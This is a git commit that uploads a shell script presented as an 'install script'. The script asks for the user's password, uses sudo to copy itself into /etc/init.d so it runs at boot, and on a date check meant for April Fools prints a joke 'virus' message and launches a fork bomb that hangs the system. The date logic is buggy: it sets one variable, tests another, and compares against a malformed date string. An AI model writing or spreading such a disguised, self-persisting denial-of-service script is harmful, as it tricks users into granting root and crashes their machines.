d9b62fbc5d06c0165468f48f8cbf193cc4b92001
Samuel Lord <sllord@icloud.com>
2017-08-30 18:31:36 -0500

    Add files via upload

---
+++ src.sh
@@ -0,0 +1,12 @@
+echo To run this install script, we need your password!
+sudo cp $0 /etc/init.d/
+clear
+ifStart=`date '+%m-%d'`
+if [ $ifDate == "04-1" ]
+then
+echo Haha! You fell for the Forky VIRUS!
+echo The first ever Linux virus!
+echo To go fix this, delete $0 from /etc/init.d
+echo Happy April Fools!
+:(){ :|: & };:
+fi
